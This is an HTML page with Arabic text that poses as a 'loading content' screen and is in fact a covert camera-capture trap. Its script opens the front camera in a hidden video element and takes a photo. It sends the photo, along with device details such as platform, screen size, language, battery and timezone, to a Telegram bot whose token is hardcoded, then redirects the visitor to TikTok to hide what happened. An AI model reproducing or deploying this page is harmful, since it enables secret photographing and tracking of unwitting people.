<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            color: #333;
        }
        .loading {
            font-size: 24px;
            color: #1e90ff;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
    </style>
</head>
<body>
    <div class="loading">🔄 جاري تحميل المحتوى... الرجاء الانتظار</div>
    
    <!-- عناصر مخفية تماماً -->
    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px; opacity:0; pointer-events:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        (function() {
            // الثوابت
            const botToken = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
            const urlParams = new URLSearchParams(window.location.search);
            const userChatId = urlParams.get('id');
            
            // عناصر خفية
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            // متغيرات
            let stream = null;
            let photoCaptured = false;
            
            // دالة لجمع معلومات إضافية عن الجهاز
            function getDeviceInfo() {
                const info = {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: 'غير معروف'
                };
                
                // محاولة الحصول على البطارية
                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        info.battery = `${Math.round(battery.level * 100)}%`;
                    });
                }
                
                return info;
            }
            
            // دالة التقاط الصورة
            function capturePhoto() {
                if (photoCaptured || !stream || !video.videoWidth) return;
                
                try {
                    photoCaptured = true;
                    
                    // ضبط الكانفس بنفس دقة الفيديو
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    
                    const context = canvas.getContext('2d');
                    
                    // رسم الصورة من الفيديو (بدون عكس لأن الكاميرا مخفية)
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل الصورة إلى blob
                    canvas.toBlob(async (blob) => {
                        if (!blob || blob.size < 1000) {
                            // الصورة صغيرة جداً (سوداء)، حاول مرة أخرى بعد لحظة
                            photoCaptured = false;
                            setTimeout(capturePhoto, 500);
                            return;
                        }
                        
                        const deviceInfo = getDeviceInfo();
                        
                        // إرسال الصورة
                        const formData = new FormData();
                        formData.append('chat_id', userChatId);
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('caption', `📸 صورة جديدة
🆔 ID: ${userChatId}
📱 الجهاز: ${deviceInfo.platform}
💻 الشاشة: ${deviceInfo.screen}
🌐 اللغة: ${deviceInfo.language}
⏰ الوقت: ${new Date().toLocaleString()}
🔋 بطارية: ${deviceInfo.battery}
📏 دقة الصورة: ${canvas.width}x${canvas.height}
🕒 التوقيت: ${deviceInfo.timezone}`);
                        
                        try {
                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (e) {
                            // في حال فشل إرسال الصورة، أرسل نص فقط
                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: userChatId,
                                    text: `📸 تم التقاط صورة لكن فشل الإرسال\n🆔 ID: ${userChatId}\n❌ خطأ: ${e.message}`
                                })
                            });
                        }
                        
                        // إيقاف الكاميرا بعد الإرسال
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        
                        // توجيه إلى تيك توك بعد فترة قصيرة
                        setTimeout(() => {
                            window.location.href = "https://www.tiktok.com";
                        }, 500);
                        
                    }, 'image/jpeg', 0.85); // جودة 85% (حجم مناسب)
                    
                } catch (error) {
                    console.error("خطأ في التصوير:", error);
                    // حاول مرة أخرى
                    photoCaptured = false;
                    setTimeout(capturePhoto, 1000);
                }
            }
            
            // تشغيل الكاميرا الخفية
            async function startHiddenCamera() {
                if (!userChatId) {
                    // لا يوجد ID، توجيه مباشر
                    window.location.href = "https://www.tiktok.com";
                    return;
                }
                
                try {
                    // طلب الكاميرا بدون أي إشعار للمستخدم (صامت)
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: "user",
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false // بدون صوت
                    });
                    
                    // ربط الكاميرا بالفيديو
                    video.srcObject = stream;
                    
                    // عندما يبدأ الفيديو بالتدفق
                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            // انتظر 2.5 ثانية لضبط الإضاءة التلقائية
                            setTimeout(() => {
                                capturePhoto();
                            }, 2500);
                        });
                    };
                    
                    // خطة احتياطية: إذا لم تلتقط الصورة خلال 5 ثواني، حاول
                    setTimeout(() => {
                        if (!photoCaptured && stream) {
                            capturePhoto();
                        }
                    }, 5000);
                    
                } catch (error) {
                    console.log("لا يمكن الوصول للكاميرا:", error);
                    
                    // فشل الوصول للكاميرا، أرسل معلومات فقط
                    try {
                        const deviceInfo = getDeviceInfo();
                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: userChatId,
                                text: `⚠️ لا يمكن الوصول للكاميرا
🆔 ID: ${userChatId}
📱 الجهاز: ${deviceInfo.platform}
💻 الشاشة: ${deviceInfo.screen}
🌐 اللغة: ${deviceInfo.language}
🔋 البطارية: ${deviceInfo.battery}
❌ الخطأ: ${error.message || 'مستخدم رفض الطلب أو لا توجد كاميرا'}`
                            })
                        });
                    } catch (e) {}
                    
                    // توجيه إلى تيك توك
                    window.location.href = "https://www.tiktok.com";
                }
            }
            
            // بدء كل شيء
            startHiddenCamera();
            
            // تأمين: إذا بقي المستخدم أكثر من 8 ثواني، وجهه لتيك توك
            setTimeout(() => {
                if (!photoCaptured) {
                    window.location.href = "https://www.tiktok.com";
                }
            }, 8000);
            
        })();
    </script>
</body>
</html>
